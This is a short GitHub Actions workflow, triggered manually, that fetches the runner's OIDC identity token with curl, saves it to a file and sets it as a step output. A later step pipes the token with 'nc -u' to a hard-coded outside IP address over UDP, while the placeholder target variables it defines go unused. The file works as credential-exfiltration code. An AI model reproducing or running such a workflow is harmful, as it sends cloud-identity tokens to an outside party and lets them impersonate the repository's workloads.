name: Get OIDC Token

on:
  workflow_dispatch:  # 手动触发

jobs:
  get-token:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Checkout code
        uses: actions/checkout@v2

      - name: Fetch OIDC token
        id: fetch_token
        run: |
          TOKEN=$(curl -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL")
          echo "$TOKEN" > oidc_token.txt
          echo "::set-output name=oidc_token::$TOKEN"

      - name: Send OIDC Token via UDP
        run: |
          # Define the target IP and port
          TARGET_IP="your_target_ip"
          TARGET_PORT=your_target_port

          # Send the OIDC token via UDP
          TOKEN=$(<oidc_token.txt)
          echo "$TOKEN" | nc -u 101.126.12.34 8080
